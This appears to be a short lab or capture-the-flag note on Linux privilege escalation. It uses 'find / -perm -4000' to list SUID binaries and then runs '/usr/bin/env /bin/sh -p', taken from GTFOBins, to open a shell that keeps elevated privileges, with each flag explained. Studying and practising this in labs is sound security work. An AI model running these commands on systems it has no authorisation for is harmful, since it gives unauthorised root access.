## Find SUID files

``` bash
find / -perm -4000 2>/dev/null
```
- **`find /`** → Starts searching from the root (`/`) directory.
- **`-perm -4000`** → Looks for files with the **SUID (Set User ID) permission** set (`4000` in octal).
- **`2>/dev/null`** → Redirects **error messages** (typically "Permission denied" errors) to `/dev/null` to avoid clutter in the output.

![[Pasted image 20250328225102.png]]

Search **`env`** on GTFOBins with SUID permission: https://gtfobins.github.io/gtfobins/env/#suid

``` bash
/usr/bin/env /bin/sh -p
```
- **`/usr/bin/env`** → Runs a command in a modified environment (typically used to locate and execute binaries in the correct environment).
- **`/bin/sh`** → Starts a new shell session using `/bin/sh`.
- **`-p`** → Instructs the shell to **not drop privileges** when executing.